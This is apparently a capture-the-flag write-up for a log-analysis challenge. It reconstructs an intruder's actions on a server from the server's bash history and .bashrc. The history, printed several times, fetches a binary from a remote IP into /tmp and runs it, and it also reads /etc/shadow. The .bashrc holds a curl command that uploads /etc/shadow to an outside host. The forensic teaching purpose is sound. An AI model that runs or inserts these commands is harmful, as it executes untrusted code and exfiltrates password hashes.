# NCL 2016 : Compromise-100

__Category__: Log Analysis

__Points__: 100

## Write-up

<a href="https://jhalon.github.io/images/nclp-2.png"><img src="https://jhalon.github.io/images/nclp-2.png"></a>

For this challenge we are provided the following file: [NCL-2016-Game2-Compromise.zip](https://jhalon.github.io/download/NCL-2016-Game2-Compromise.zip)

--

__From what URL did the hacker download malware from?__

Since this is a Folder instead of a file, we have to dig through it and see what’s in there.

```console
root@kali:~# cd Downloads/
root@kali:~/Downloads# cd NCL-2016-Game2-Compromise/
root@kali:~/Downloads/NCL-2016-Game2-Compromise# cd dir
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# ls
application  docs  README.md
```

We can see that we have a README file, documents for the game, and the application itself. Now this is the "trick" part, there is nothing in these folders. We actually have to dig a little deeper! Since they say the hackers tried to break into a "server" we can assume that these files were being hosted... so let's check for all "hidden" files in the folder.

```console
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# ls -a
.  ..  application  .bash_history  .bashrc  docs  README.md
```

After listing all files, we can see that we have the bash history and the interactive bash shell script. So first thing we can do is check the bash history for commands that the hacker could have ran on the server.

```console
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# cat .bash_history 
cd ~/docs
ls
vim 100 0 0.5 10 .csv
vim 100\ 0\ 0.5\ 10\ .csv
vim 100\ 0\ 4.0\ 20\ .csv
vim README.md
---snip---
whoami
killall -9 ttserve 
lynx -source http://216.242.103.2:8882/foo > /tmp/ttserve 
chmod 755 /tmp/ttserve 
cd /tmp 
./ttserve 
rm -rf /tmp/ttserve ./ttserve
netstat -plant
ps kill -9 12432
clear
ls
vim ~/.bashrc
vim /etc/hosts
cat /etc/passwd
cat /etc/shadow
ifconfig
nmap -sL -n 192.168.2.1/32 | grep 'Nmap scan report for' | cut -f 5 -d ' '
cd application/l
cd application/
ls
git diff
git status
git commit
git push origin master
cd ../
cat README.md
```

Looking into the output of the file, we can see that [Lynx](https://linux.die.net/man/1/lynx) is being used, which is a command line web browser. This would be the URL that is downloading the malware.

__Answer: http://216.242.103.2:8882/foo__

--

__What is the port hosting the malware download?__

Simple... just look at the URL Port on answer 1.

__Answer: 8882__

--

__What is the PID of the program that the hacker killed?__

Back in the output - let's look for the [ps](https://linux.die.net/man/1/ps) command and see what PID its killing.

```console
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# cat .bash_history 
cd ~/docs
ls
vim 100 0 0.5 10 .csv
vim 100\ 0\ 0.5\ 10\ .csv
vim 100\ 0\ 4.0\ 20\ .csv
vim README.md
---snip---
whoami
killall -9 ttserve 
lynx -source http://216.242.103.2:8882/foo > /tmp/ttserve 
chmod 755 /tmp/ttserve 
cd /tmp 
./ttserve 
rm -rf /tmp/ttserve ./ttserve
netstat -plant
ps kill -9 12432
clear
ls
vim ~/.bashrc
vim /etc/hosts
cat /etc/passwd
cat /etc/shadow
ifconfig
nmap -sL -n 192.168.2.1/32 | grep 'Nmap scan report for' | cut -f 5 -d ' '
cd application/l
cd application/
ls
git diff
git status
git commit
git push origin master
cd ../
cat README.md
```

__Answer: 12432__

--

__What is the IP range the hacker scanned (use the exact argument)?__

Well "scanned" is the keyword here, so let's look for [Nmap](https://nmap.org/book/man-briefoptions.html)!

```console
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# cat .bash_history 
cd ~/docs
ls
vim 100 0 0.5 10 .csv
vim 100\ 0\ 0.5\ 10\ .csv
vim 100\ 0\ 4.0\ 20\ .csv
vim README.md
---snip---
whoami
killall -9 ttserve 
lynx -source http://216.242.103.2:8882/foo > /tmp/ttserve 
chmod 755 /tmp/ttserve 
cd /tmp 
./ttserve 
rm -rf /tmp/ttserve ./ttserve
netstat -plant
ps kill -9 12432
clear
ls
vim ~/.bashrc
vim /etc/hosts
cat /etc/passwd
cat /etc/shadow
ifconfig
nmap -sL -n 192.168.2.1/32 | grep 'Nmap scan report for' | cut -f 5 -d ' '
cd application/l
cd application/
ls
git diff
git status
git commit
git push origin master
cd ../
cat README.md
```

__Answer: 192.168.2.1/32__

--

__What is the first file the hacker modified the contents of?__

We simply have to look for a file editor that is being used. In this one it seems [vim](https://en.wikipedia.org/wiki/Vim_(text_editor)) is being used. Try not to get confused with the first few lines! Look past the [whoami](https://en.wikipedia.org/wiki/Whoami) command that is being used by the hacker after the certain "breach".

```console
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# cat .bash_history 
cd ~/docs
ls
vim 100 0 0.5 10 .csv
vim 100\ 0\ 0.5\ 10\ .csv
vim 100\ 0\ 4.0\ 20\ .csv
vim README.md
---snip---
whoami
killall -9 ttserve 
lynx -source http://216.242.103.2:8882/foo > /tmp/ttserve 
chmod 755 /tmp/ttserve 
cd /tmp 
./ttserve 
rm -rf /tmp/ttserve ./ttserve
netstat -plant
ps kill -9 12432
clear
ls
vim ~/.bashrc
vim /etc/hosts
cat /etc/passwd
cat /etc/shadow
ifconfig
nmap -sL -n 192.168.2.1/32 | grep 'Nmap scan report for' | cut -f 5 -d ' '
cd application/l
cd application/
ls
git diff
git status
git commit
git push origin master
cd ../
cat README.md
```

__Answer: vim ~/.bashrc__

--

__What is the second file the hacker modified the contents of?__

Same as above... just look at the next vim edit!

```console
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# cat .bash_history 
cd ~/docs
ls
vim 100 0 0.5 10 .csv
vim 100\ 0\ 0.5\ 10\ .csv
vim 100\ 0\ 4.0\ 20\ .csv
vim README.md
---snip---
whoami
killall -9 ttserve 
lynx -source http://216.242.103.2:8882/foo > /tmp/ttserve 
chmod 755 /tmp/ttserve 
cd /tmp 
./ttserve 
rm -rf /tmp/ttserve ./ttserve
netstat -plant
ps kill -9 12432
clear
ls
vim ~/.bashrc
vim /etc/hosts
cat /etc/passwd
cat /etc/shadow
ifconfig
nmap -sL -n 192.168.2.1/32 | grep 'Nmap scan report for' | cut -f 5 -d ' '
cd application/l
cd application/
ls
git diff
git status
git commit
git push origin master
cd ../
cat README.md
```

__Answer: vim /etc/hosts__

--

__What is the URL that the hacker uses to process uploads of the /etc/shadow file (use the full URL, including port)?__

For this one the answer won't be in the bash history... but it will be in the bash shell script. This might be due to the fact that the hacker had no admin permissions and needed a way to upload the file - thus the __.bashrc__ might have improper permissions set, giving all users "root" privilege.

```console
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# ls -a
.  ..  application  .bash_history  .bashrc  docs  README.md
root@kali:~/Downloads/NCL-2016-Game2-Compromise/dir# cat .bashrc 
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

---snip---

curl \
  -F "image=@/etc/shadow" \
  http://216.242.103.2:3000/uploader.php
```
__Answer: http://216.242.103.2:3000/uploader.php__

--

## Other Write-ups and Resources

* https://jhalon.github.io/ncl-regular-season-1/
